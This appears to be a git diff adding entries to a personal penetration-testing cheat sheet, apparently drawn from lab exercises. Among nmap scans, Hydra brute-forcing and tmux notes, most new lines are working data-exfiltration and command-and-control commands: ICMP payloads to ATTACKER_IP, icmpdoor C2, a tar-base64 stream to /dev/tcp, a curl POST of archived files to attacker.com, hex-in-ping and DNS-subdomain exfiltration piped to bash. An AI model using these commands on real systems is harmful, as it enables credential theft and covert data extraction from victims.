@@ -44,11 +44,27 @@ nmap -sV -sC -O -p- -n -Pn -oA fullscan <IP> # # Nmap fast scan for all the port
 nmap -sU -sV --version-intensity 0 -n -F -T4 <IP> # # Nmap fast check if any of the 100 most common UDP services is running
 nmap -sU -sV -sC -n -F -T4 <IP> # # Nmap check if any of the 100 most common UDP services is running and launch defaults scripts
 
+# ======
+# netcat
+# ======
+
+nc -l -p 567 # netcat listening on tcp port 567
+nc 1.2.3.4 5676 # Connecting to that port from another machine
+nc -lvp 8080 > /tmp/creds.data # Recieve data on port 8080 and pipe it to creds.data
+
 # =====
 # Hydra
 # =====
 hydra -l name -P rockyou.txt ftp://<target>:21 -v
 
+# ====
+# tmux
+# ====
+tmux # Starting tmux
+Ctrl+b, d # Detach from a tmux session
+tmux attach-session -t session_name # Attach to a tmux session
+tmux ls # List tmux sessions
+tmux new-session -s session_name # Create a new session
 
 # =========
 # Bettercap
@@ -110,13 +126,48 @@ sudo yersinia cdp -attack 0 # Send a CDP packet
 yersinia dhcp -attack 1
 yersinia dhcp -attack 3 #More parameters are needed
 
+# =====
+# nping
+# =====
+sudo nping --icmp -c 1 ATTACKER_IP --data-string "BOFfile.txt" # ICMP Data Exfiltration: Sending the Trigger Value from the Victim
+sudo nping --icmp -c 1 ATTACKER_IP --data-string "admin:password" # ICMP Data Exfiltration: Exfiltrating sensitive data from victim
+sudo nping --icmp -c 1 ATTACKBOX_IP --data-string "EOF" # ICMP Data Exfiltration: Sending the End of File trigger Value from the Victim
+sudo nping --icmp -c 1 10.10.27.8 --data-string "admin:password" # 
+
+# =======
+# tcpdump
+# =======
+sudo tcpdump -i eth0 udp port 53 -v  # Capturing DNS Requests
 
 
+# ========
+# icmpdoor
+# ========
+sudo icmpdoor -i eth0 -d 192.168.0.133 # Run the icmpdoor command
+sudo icmp-cnc -i eth1 -d 192.168.0.121 # Establish C2 to the victim host
+
+# ==========
+# Metasploit
+# ==========
+set INTERFACE eth0 # Setting interface in MSF
+use auxiliary/server/icmp_exfil # ICMP exfiltration
+
+IyEvYmluL2Jhc2ggCnBpbmcgLWMgMSB0ZXN0LnRobS5jb20K
 
 
-
-
-
-
-
-
+# Random
+# Tar creates an Archive. z is for using gzip to compress the selected folder, the c is for creating a new archive, and the f is for using an archive file. Then pipe/convert to base64
+# Then, we passed the result of the base64 command to create and copy a backup file with the dd command using EBCDIC encoding data.
+tar zcf - creds/ | base64 | dd conv=ebcdic > /dev/tcp/192.168.0.133/8080 # TCP Socket Exfiltration from Victim
+dd conv=ascii if=creds.data |base64 -d > creds.tar # Covert to ascii, then decode the base64
+tar xvf creds.tar # We used the tar command to unarchive the file with the xvf arguments. The x is for extracting the tar file, the v for verbosely listing files, and the f is for using an archive file.
+tar cf - task5/ | ssh thm@jump.thm.com "cd /tmp/; tar xpf -" # SSH Exfiltration
+# We used the curl command with --data argument to send a POST request via the file parameter. Note that we created an archived file of the secret folder using the tar command. We also converted the output of the tar command into base64 representation.
+curl --data "file=$(tar zcf - datafile | base64)" http://attacker.com/datahandler.py # Sending POST data via CURL
+sudo sed -i 's/ /+/g' /tmp/http.bs64 # Fixing base64 url encoding while exfiltrating
+echo "user1:admin" | xxd -p # Using the xxd command to convert text to Hex
+ping 10.10.154.3 -c 1 -p 74686d3a7472796861636b6d650a # Send Hex using the ping command
+cat sensitive_data.txt | base64 | tr -d "\n"| fold -w18 | sed -r 's/.*/&.att.tunnel.com/' # Splitting Sensitive data across DNS Names for DNS Exfiltration
+cat sensitive_data.txt | base64 | tr -d "\n" | fold -w18 | sed 's/.*/&./' | tr -d "\n" | sed s/$/att.tunnel.com/ | awk '{print "dig +short " $1}' | bash
+# Cleaning and restoring Exfiltrated DNS Data
+echo "TmFtZTogVEhNLXVzZX.IKQWRkcmVzczogMTIz.NCBJbnRlcm5ldCwgVE.hNCkNyZWRpdCBDYXJk.OiAxMjM0LTEyMzQtMT.IzNC0xMjM0CkV4cGly.ZTogMDUvMDUvMjAyMg.pDb2RlOiAxMzM3Cg==.att.tunnel.com." | cut -d"." -f1-8 | tr -d "." | base64 -d
